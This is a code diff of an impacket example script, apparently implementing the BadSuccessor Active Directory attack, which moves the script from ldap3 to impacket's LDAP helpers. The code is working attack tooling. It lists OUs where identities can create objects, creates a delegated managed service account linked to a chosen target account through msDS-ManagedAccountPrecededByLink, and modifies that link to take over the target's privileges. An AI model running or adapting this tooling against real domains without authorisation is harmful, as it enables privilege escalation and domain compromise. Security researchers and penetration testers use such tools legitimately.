@@ -26,15 +26,20 @@ import logging
 import random
 import string
 import sys
-import ldap3
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.utils import parse_identity, parse_target, init_ldap_session
-from impacket.ldap import ldaptypes
+from impacket.examples.utils import (parse_identity, parse_target, ldap_login,
+                                      as_bytes, as_string, as_sid_string,
+                                      search_entries)
+from impacket.ldap import ldap, ldapasn1, ldaptypes
 import uuid #needed for proper GUID conversion
+from impacket.ldap.ldap import get_entry_dn, get_entry_value, get_entry_values
 
 class BADSUCCESSOR:
+    LDAP_SCOPE_BASE = ldap.Scope('baseObject')
+    LDAP_SCOPE_SUBTREE = ldap.Scope('wholeSubtree')
+
     def __init__(self, username, password, domain, lmhash, nthash, cmdLineOptions):
         self.__username = username
         self.__password = password
@@ -92,28 +97,24 @@ class BADSUCCESSOR:
 
         try:
             use_ldaps = (self.__method == 'LDAPS')
-            
-            # For Kerberos authentication, ensure proper target resolution
-            if self.__doKerberos:
-                target_host = self.__target if self.__target else self.__domain
-                dc_ip = self.__kdcHost if self.__kdcHost else self.__targetIp
-            else:
-                target_host = self.__target if self.__target else self.__domain
-                dc_ip = self.__targetIp
-            
-            _, ldapConnection = init_ldap_session(
-                domain=self.__domain,
-                username=self.__username,
-                password=self.__password,
-                lmhash=self.__lmhash,
-                nthash=self.__nthash,
-                k=self.__doKerberos,
-                dc_ip=dc_ip,
-                dc_host=target_host,
-                aesKey=self.__aesKey,
-                use_ldaps=use_ldaps
+
+            target_host = self.__target if self.__target else self.__domain
+            dc_ip = self.__targetIp
+
+            ldapConnection = ldap_login(
+                target_host,
+                self.__baseDN,
+                dc_ip,
+                target_host,
+                self.__doKerberos,
+                self.__username,
+                self.__password,
+                self.__domain,
+                self.__lmhash,
+                self.__nthash,
+                self.__aesKey,
+                ldaps_flag=use_ldaps,
             )
-            
         except Exception as e:
             raise Exception('Could not connect to LDAP server: %s' % str(e))
 
@@ -134,7 +135,7 @@ class BADSUCCESSOR:
             logging.error('Unknown action: %s' % self.__action)
             result = False
 
-        ldapConnection.unbind()
+        ldapConnection.close()
         return result
 
     def delete_dmsa(self, ldapConnection):
@@ -159,10 +160,7 @@ class BADSUCCESSOR:
             logging.info("%-30s %s" % ("-" * 30, "-" * 30))
             logging.info("%-30s %s" % ("dMSA Name:", '%s$' % self.__dmsaName))
             logging.info("%-30s %s" % ("Status:", "SUCCESS" if success else "FAILED"))
-            
-            if not success and ldapConnection.result:
-                logging.error("%-30s %s" % ("Error:", ldapConnection.result))
-            
+
             return success
                 
         except Exception as e:
@@ -171,15 +169,15 @@ class BADSUCCESSOR:
     
     def check_account_exists(self, ldapConnection, dn):
         try:
-            success = ldapConnection.search(
-                search_base=dn,
-                search_filter='(objectClass=*)',
-                search_scope=ldap3.BASE,
+            entries = search_entries(
+                ldapConnection,
+                '(objectClass=*)',
+                dn,
+                search_scope=self.LDAP_SCOPE_BASE,
                 attributes=['cn']
             )
-            
-            return success and len(ldapConnection.entries) > 0
-                
+
+            return len(entries) > 0
         except Exception as e:
             logging.debug('Error checking account existence: %s' % str(e))
             # If we can't determine, assume it doesn't exist to avoid blocking operations
@@ -188,71 +186,58 @@ class BADSUCCESSOR:
     def search_ous(self, ldapConnection):
         try:
             logging.info('Searching for OUs vulnerable to BadSuccessor attack...')
-            
-            if not ldapConnection.bound:
-                logging.error('LDAP connection is not bound')
-                return False
-            
-            success = ldapConnection.search(
-                search_base=self.__baseDN,
-                search_filter='(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
-                search_scope=ldap3.SUBTREE,
+
+            dc_entries = search_entries(
+                ldapConnection,
+                '(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
+                self.__baseDN,
+                search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['operatingSystem', 'operatingSystemVersion']
             )
-
-            if not success:
-                logging.error('Failed to search for Domain Controllers: %s' % ldapConnection.result)
-                return False
-
             prereq_flag = False
-            for entry in ldapConnection.entries:
-                if ('operatingSystem' and 'operatingSystemVersion') not in entry:
-                    logging.error('Could not retrieve operating system information for Domain Controller: %s' % entry.entry_dn)
-                    pass
-                else:
-                    if 'Windows Server 2025' in entry.operatingSystem.value or '26100' in entry.operatingSystemVersion.value:
-                        logging.info('Found Windows Server 2025 Domain Controller: %s' % entry.entry_dn)
-                        prereq_flag = True
-                        break
+            for entry in dc_entries:
+                operating_system = as_string(get_entry_value(entry, 'operatingSystem'))
+                operating_system_version = as_string(get_entry_value(entry, 'operatingSystemVersion'))
+                if not operating_system or not operating_system_version:
+                    logging.error('Could not retrieve operating system information for Domain Controller: %s' % get_entry_dn(entry))
+                    continue
+
+                if 'Windows Server 2025' in operating_system or '26100' in operating_system_version:
+                    logging.info('Found Windows Server 2025 Domain Controller: %s' % get_entry_dn(entry))
+                    prereq_flag = True
+                    break
             
             if not prereq_flag:
                 logging.info('No Windows Server 2025 Domain Controllers found. This script requires at least one DC running Windows Server 2025.')
                 logging.info('Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.')
                     
-
-            success = ldapConnection.search(
-                search_base=self.__baseDN,
-                search_filter='(objectClass=organizationalUnit)',
-                search_scope=ldap3.SUBTREE,
+            ou_entries = search_entries(
+                ldapConnection,
+                '(objectClass=organizationalUnit)',
+                self.__baseDN,
+                search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['distinguishedName', 'nTSecurityDescriptor'],
-                controls=ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x5)
+                search_controls=[ldapasn1.SDFlagsControl(flags=0x5)]
             )
-
-            
-            if not success:
-                logging.error('Failed to search for organizational units: %s' % ldapConnection.result)
-                return False
-            
-            # Store the OU entries before they get overwritten by other searches
-            ou_entries = list(ldapConnection.entries)
             logging.info('Found %d organizational units' % len(ou_entries))
             
             # Get domain SID for filtering excluded accounts
+            domain_sid = None
             try:
-                success = ldapConnection.search(
-                    search_base=self.__baseDN,
-                    search_filter='(objectClass=domain)',
-                    search_scope=ldap3.BASE,
+                domain_entries = search_entries(
+                    ldapConnection,
+                    '(objectClass=domain)',
+                    self.__baseDN,
+                    search_scope=self.LDAP_SCOPE_BASE,
                     attributes=['objectSid']
                 )
-                
-                if success and len(ldapConnection.entries) > 0:
-                    entry = ldapConnection.entries[0]
-                    if 'objectSid' in entry:
-                        domain_sid = entry.objectSid.value
+
+                if domain_entries:
+                    domain_sid = as_sid_string(get_entry_value(domain_entries[0], 'objectSid'))
             except Exception as e:
                 logging.error('Failed to retrieve domain SID: %s' % str(e))
                 return False
+
             allowed_identities = {}
             
             relevant_rights = {
@@ -269,12 +254,11 @@ class BADSUCCESSOR:
             
             for entry in ou_entries:
                 try:
-                    ou_dn = str(entry.entry_dn)
-                    
-                    if 'nTSecurityDescriptor' not in entry or not entry.nTSecurityDescriptor.value:
+                    ou_dn = get_entry_dn(entry)
+                    sd_data = as_bytes(get_entry_value(entry, 'nTSecurityDescriptor'))
+                    if not sd_data:
                         continue
-                        
-                    sd_data = entry.nTSecurityDescriptor.value
+
                     sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                     
                     # Process DACL entries (ACEs)
@@ -385,17 +369,17 @@ class BADSUCCESSOR:
             if sid in well_known_sids:
                 return well_known_sids[sid]
             
-            success = ldapConnection.search(
-                search_base=self.__baseDN,
-                search_filter='(objectSid=%s)' % sid,
-                search_scope=ldap3.SUBTREE,
+            entries = search_entries(
+                ldapConnection,
+                '(objectSid=%s)' % sid,
+                self.__baseDN,
+                search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['sAMAccountName']
             )
-            
-            if success and len(ldapConnection.entries) > 0:
-                entry = ldapConnection.entries[0]
-                if 'sAMAccountName' in entry:
-                    username = entry.sAMAccountName.value
+
+            if entries:
+                username = as_string(get_entry_value(entries[0], 'sAMAccountName'))
+                if username:
                     return '%s\\%s' % (self.__domain.upper(), username)
                     
             return sid
@@ -529,7 +513,6 @@ class BADSUCCESSOR:
                 dns_hostname = '%s.%s' % (self.__dmsaName.lower(), self.__domain)
             
             attributes = {
-                'objectClass': ['msDS-DelegatedManagedServiceAccount'],
                 'cn': self.__dmsaName,
                 'sAMAccountName': '%s$' % self.__dmsaName,
                 'dNSHostName': dns_hostname,
@@ -543,19 +526,18 @@ class BADSUCCESSOR:
             group_msa_membership = None
             try:
                 search_filter = '(&(objectClass=user)(sAMAccountName=%s))' % principals_allowed
-                success = ldapConnection.search(
-                    search_base=self.__baseDN,
-                    search_filter=search_filter,
-                    search_scope=ldap3.SUBTREE,
+                entries = search_entries(
+                    ldapConnection,
+                    search_filter,
+                    self.__baseDN,
+                    search_scope=self.LDAP_SCOPE_SUBTREE,
                     attributes=['objectSid'])
-                if success and len(ldapConnection.entries) > 0:
-                    entry = ldapConnection.entries[0]
-                    if 'objectSid' in entry:
-                        user_sid = entry.objectSid.value
-                        if user_sid:
-                            descriptor = self.build_security_descriptor(user_sid)
-                            group_msa_membership = descriptor
-                            attributes['nTSecurityDescriptor'] = descriptor
+                if entries:
+                    user_sid = as_sid_string(get_entry_value(entries[0], 'objectSid'))
+                    if user_sid:
+                        descriptor = self.build_security_descriptor(user_sid)
+                        group_msa_membership = descriptor
+                        attributes['nTSecurityDescriptor'] = descriptor
                 
             except Exception as e:
                 logging.debug('Error building MSA membership: %s' % str(e))
@@ -565,20 +547,22 @@ class BADSUCCESSOR:
                 attributes['msDS-GroupMSAMembership'] = group_msa_membership
 
             target_dn = None
-            success = ldapConnection.search(
-                search_base=self.__baseDN, 
-                search_filter='(&(objectClass=*)(sAMAccountName=%s))' % target_account,
-                search_scope=ldap3.SUBTREE,
+            entries = search_entries(
+                ldapConnection,
+                '(&(objectClass=*)(sAMAccountName=%s))' % target_account,
+                self.__baseDN,
+                search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['distinguishedName', 'objectClass']
             )
 
-            if success and len(ldapConnection.entries) > 0:
-                for entry in ldapConnection.entries:
-                    object_classes = [str(oc).lower() for oc in entry.objectClass.values]
+            if entries:
+                for entry in entries:
+                    object_classes = [as_string(value).lower() for value in get_entry_values(entry, 'objectClass')]
                     if 'user' in object_classes or 'computer' in object_classes:
-                        target_dn = str(entry.entry_dn)
-                # Return first match if no user/computer found
-                target_dn = str(ldapConnection.entries[0].entry_dn)
+                        target_dn = get_entry_dn(entry)
+                        break
+                if target_dn is None:
+                    target_dn = get_entry_dn(entries[0])
 
                 if target_dn:
                     attributes['msDS-ManagedAccountPrecededByLink'] = target_dn
@@ -589,7 +573,7 @@ class BADSUCCESSOR:
                 logging.error('Target account not found: %s' % target_account)
                 return False
             
-            success = ldapConnection.add(dmsa_dn, attributes=attributes)
+            success = ldapConnection.add(dmsa_dn, ['msDS-DelegatedManagedServiceAccount'], attributes=attributes)
 
             if success:
                 logging.info("")
@@ -600,10 +584,6 @@ class BADSUCCESSOR:
                 logging.info("%-30s %s" % ("Principals Allowed:", principals_allowed))
                 logging.info("%-30s %s" % ("Target Account:", target_account))
                 return True
-            else:
-                if ldapConnection.result:
-                    logging.error('LDAP error: %s' % ldapConnection.result)
-                return False
                 
         except Exception as e:
             logging.error('dMSA creation failed: %s' % str(e))
@@ -618,39 +598,39 @@ class BADSUCCESSOR:
                 return False
 
             # Get current target account value
-            success = ldapConnection.search(
-                search_base=dmsa_dn,
-                search_filter='(objectClass=msDS-DelegatedManagedServiceAccount)',
-                search_scope=ldap3.BASE,
+            entries = search_entries(
+                ldapConnection,
+                '(objectClass=msDS-DelegatedManagedServiceAccount)',
+                dmsa_dn,
+                search_scope=self.LDAP_SCOPE_BASE,
                 attributes=['msDS-ManagedAccountPrecededByLink']
             )
-            
-            current_target_dn = None
-            if success and len(ldapConnection.entries) > 0:
-                entry = ldapConnection.entries[0]
-                if hasattr(entry, 'msDS-ManagedAccountPrecededByLink'):
-                    current_target_dn = entry['msDS-ManagedAccountPrecededByLink'].value
 
-            success = ldapConnection.search(
-                search_base=self.__baseDN, 
-                search_filter='(&(objectClass=*)(sAMAccountName=%s))' % self.__targetAccount,
-                search_scope=ldap3.SUBTREE,
+            current_target_dn = None
+            if entries:
+                current_target_dn = as_string(get_entry_value(entries[0], 'msDS-ManagedAccountPrecededByLink'))
+
+            entries = search_entries(
+                ldapConnection,
+                '(&(objectClass=*)(sAMAccountName=%s))' % self.__targetAccount,
+                self.__baseDN,
+                search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['distinguishedName', 'objectClass']
             )
 
-            if not (success and len(ldapConnection.entries) > 0):
+            if not entries:
                 logging.error('Target account not found: %s' % self.__targetAccount)
                 return False
 
             target_dn = None
-            for entry in ldapConnection.entries:
-                object_classes = [str(oc).lower() for oc in entry.objectClass.values]
+            for entry in entries:
+                object_classes = [as_string(value).lower() for value in get_entry_values(entry, 'objectClass')]
                 if 'user' in object_classes or 'computer' in object_classes:
-                    target_dn = str(entry.entry_dn)
+                    target_dn = get_entry_dn(entry)
                     break
-            
+
             if not target_dn:
-                target_dn = str(ldapConnection.entries[0].entry_dn)
+                target_dn = get_entry_dn(entries[0])
 
             if current_target_dn == target_dn:
                 logging.info('Target account is already set to: %s' % target_dn)
@@ -658,7 +638,7 @@ class BADSUCCESSOR:
                 return True
 
             modifications = {
-                'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])]
+                'msDS-ManagedAccountPrecededByLink': [(ldap.MODIFY_REPLACE, [target_dn])]
             }
             
             success = ldapConnection.modify(dmsa_dn, modifications)
@@ -666,9 +646,6 @@ class BADSUCCESSOR:
             if success:
                 logging.info('dMSA target account modified: %s -> %s' % (current_target_dn or '(not set)', target_dn))
                 return True
-            else:
-                logging.error('Failed to modify dMSA: %s' % ldapConnection.result)
-                return False
                 
         except Exception as e:
             logging.error('Error modifying dMSA: %s' % str(e))
